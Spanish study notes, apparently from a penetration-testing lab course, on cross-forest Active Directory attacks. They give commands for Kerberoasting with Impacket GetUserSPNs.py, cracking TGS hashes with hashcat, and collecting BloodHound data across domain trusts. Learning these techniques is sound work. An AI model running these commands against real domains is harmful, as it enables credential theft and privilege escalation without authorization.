
## 1. Cross-Forest Kerberoasting con Impacket

Permite enumerar cuentas con SPN en otro dominio y solicitar sus tickets TGS para intentar crackear sus hashes fuera de línea.

### 1.1. Enumerar cuentas con SPN en el dominio objetivo

Usamos `GetUserSPNs.py` indicando el dominio objetivo y las credenciales de un usuario del dominio de origen.

```
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

**Parámetros:**

- `-target-domain`: dominio en el que queremos buscar cuentas con SPN.
    
- `INLANEFREIGHT.LOCAL/wley`: dominio de origen y usuario cuyas credenciales utilizamos.
    

El comando solicita la contraseña del usuario y muestra las cuentas con SPN encontradas en el dominio objetivo.

Ejemplo de resultado:

```
ServicePrincipalName                 Name      MemberOf
-----------------------------------  --------  ------------------------------------------------------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
```

En este caso, `mssqlsvc` pertenece a `Domain Admins` del dominio `FREIGHTLOGISTICS.LOCAL`.

### 1.2. Solicitar el ticket TGS

Añadimos `-request` para solicitar los tickets TGS de las cuentas encontradas.

```
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

Para guardar el resultado directamente en un archivo:

```
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL -outputfile hashes.txt INLANEFREIGHT.LOCAL/wley
```

**Parámetros importantes:**

- `-request`: solicita los tickets TGS.
    
- `-outputfile`: guarda los hashes obtenidos en un archivo.
    

### 1.3. Crackear el hash con Hashcat

Para un hash Kerberos TGS-REP con cifrado RC4 (`etype 23`), utilizamos el modo `13100`.

```
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

Si la contraseña se recupera, podemos evaluar si permite autenticarnos como la cuenta objetivo en el dominio de confianza.

**Importante:** el modo `13100` corresponde a Kerberos 5 TGS-REP etype 23. Debemos identificar el formato del hash antes de seleccionar el modo de Hashcat.

### 1.4. Comprobaciones posteriores

Si conseguimos crackear la contraseña de una cuenta privilegiada:

1. Comprobar si la cuenta o una cuenta administrativa relacionada existe en el dominio de origen.
    
2. Investigar una posible reutilización de contraseñas entre dominios.
    
3. Comprobar, dentro del alcance autorizado, si otras cuentas de servicio reutilizan esa contraseña.
    
4. Documentar los resultados y el impacto de la reutilización de credenciales.

## 2. Enumerar pertenencias a grupos externos con BloodHound Python

`bloodhound-python` permite recopilar información de Active Directory para analizar relaciones entre dominios y detectar usuarios externos que pertenecen a grupos del dominio objetivo.

### 2.1. Configurar la resolución DNS

BloodHound necesita resolver el nombre del controlador de dominio. Si el equipo atacante no utiliza el DNS interno, podemos configurar temporalmente la resolución.

Consultamos la configuración actual:

```
cat /etc/resolv.conf
```

Ejemplo para `INLANEFREIGHT.LOCAL`:

```
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
```

Ejemplo para `FREIGHTLOGISTICS.LOCAL`:

```
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238
```

**Precaución:** en muchos sistemas, `/etc/resolv.conf` se genera automáticamente y los cambios manuales pueden sobrescribirse. Si ocurre, utiliza el mecanismo de configuración DNS de tu sistema.

Los dominios y las IP anteriores pertenecen al laboratorio del módulo. Sustitúyelos por los valores de tu entorno.

### 2.2. Recopilar datos de INLANEFREIGHT.LOCAL

```
bloodhound-python \
  -d INLANEFREIGHT.LOCAL \
  -dc ACADEMY-EA-DC01 \
  -c All \
  -u forend \
  -p 'CONTRASEÑA'
```

**Parámetros:**

- `-d`: dominio que queremos enumerar.
    
- `-dc`: nombre del controlador de dominio.
    
- `-c All`: recopila todas las categorías disponibles en la herramienta.
    
- `-u`: usuario de autenticación.
    
- `-p`: contraseña del usuario.
    

La contraseña del ejemplo debe sustituirse por la credencial autorizada del laboratorio.

La herramienta genera varios archivos JSON con información sobre usuarios, grupos, equipos, dominios y relaciones.

### 2.3. Comprimir los resultados

Podemos agrupar los JSON para facilitar su importación en BloodHound:

```
zip -r ilfreight_bh.zip *.json
```

### 2.4. Recopilar datos de FREIGHTLOGISTICS.LOCAL

Repetimos la recopilación utilizando el controlador de dominio y el dominio objetivo correspondientes.

```
bloodhound-python \
  -d FREIGHTLOGISTICS.LOCAL \
  -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL \
  -c All \
  -u 'forend@inlanefreight.local' \
  -p 'CONTRASEÑA'
```

En este ejemplo se utiliza una cuenta del dominio de origen para realizar la recopilación sobre el dominio de destino. La autenticación efectiva dependerá de la confianza, los permisos y la configuración del entorno.

**Nota:** la opción `-d` especifica el dominio que se recopila, mientras que las credenciales identifican la cuenta utilizada para autenticarse.

## 3. Analizar las relaciones entre dominios en BloodHound

Después de recopilar los datos de ambos dominios:

1. Abre la interfaz gráfica de BloodHound.
    
2. Importa los archivos JSON o el ZIP generado.
    
3. Accede a la pestaña **Analysis**.
    
4. Busca la consulta **Users with Foreign Domain Group Membership**.
    
5. Selecciona el dominio de origen `INLANEFREIGHT.LOCAL`.
    
6. Examina los usuarios y grupos que aparecen en los resultados.
    

El ejemplo del módulo muestra que:

- `INLANEFREIGHT.LOCAL\Administrator` es un usuario del dominio de origen.
    
- `FREIGHTLOGISTICS.LOCAL\Administrators` es un grupo del dominio de destino.
    
- La cuenta de administrador del primer dominio aparece como miembro del grupo de administradores del segundo.
    

Esta relación puede representar una vía de acceso privilegiado entre dominios.

**No confundas pertenencia con acceso garantizado:** hay que comprobar que la relación es efectiva y que la confianza y las políticas permiten utilizarla para acceder a los recursos.

## 4. Estrategia de enumeración entre bosques

Cuando existe una confianza entre bosques, conviene comprobar varias vías de acceso.

### Cross-Forest Kerberoasting

Buscar cuentas con SPN en el dominio de confianza, solicitar sus tickets TGS y comprobar si es posible recuperar sus contraseñas.

### Reutilización de contraseñas

Investigar si las credenciales obtenidas de cuentas privilegiadas se reutilizan en otros dominios o en cuentas de servicio.

### Pertenencia a grupos externos

Buscar cuentas de un dominio que formen parte de grupos privilegiados de otro.

### Relaciones identificadas mediante BloodHound

Recopilar información de ambos dominios y analizar las relaciones para encontrar posibles caminos de acceso.

### Confianzas hijo → padre

Si controlamos un dominio hijo, debemos recordar el ataque **ExtraSids** explicado en las secciones anteriores, que puede permitir escalar privilegios hacia el dominio padre cuando se cumplen sus requisitos.

## Conceptos clave para el examen

- **Cross-Forest Kerberoasting:** permite obtener tickets TGS de cuentas con SPN de otro dominio y atacar sus hashes fuera de línea.
    
- `**GetUserSPNs.py**`**:** herramienta de Impacket para enumerar cuentas con SPN y solicitar tickets TGS.
    
- **Hashcat** `**-m 13100**`**:** modo para Kerberos 5 TGS-REP etype 23 (RC4).
    
- `**bloodhound-python**`**:** recopila datos de Active Directory para analizar relaciones y permisos.
    
- **Foreign Group Membership:** identifica usuarios de un dominio que pertenecen a grupos de otro.
    
- **Confianza bidireccional:** puede facilitar la autenticación entre dominios, pero no concede automáticamente privilegios administrativos.
    
- **Enumeración entre bosques:** siempre conviene revisar SPN, grupos externos, reutilización de contraseñas y relaciones de confianza.
